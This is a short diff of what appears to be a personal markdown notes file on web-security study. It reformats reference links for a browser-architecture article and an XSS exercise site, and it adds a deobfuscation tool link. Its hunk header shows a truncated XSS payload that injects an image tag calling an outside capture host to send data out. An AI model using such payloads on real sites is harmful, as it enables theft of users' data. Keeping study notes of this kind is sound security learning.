@@ -102,8 +102,12 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 
 ## AST
 
-https://seal9055.com/blog/browser/browser_architecture
+- https://seal9055.com/blog/browser/browser_architecture
+
+## Obfu
+
+- https://obf-io.deobfuscate.io/
 
 ## Exercices
 
-https://alert.zeyu2001.com/
+- https://alert.zeyu2001.com/
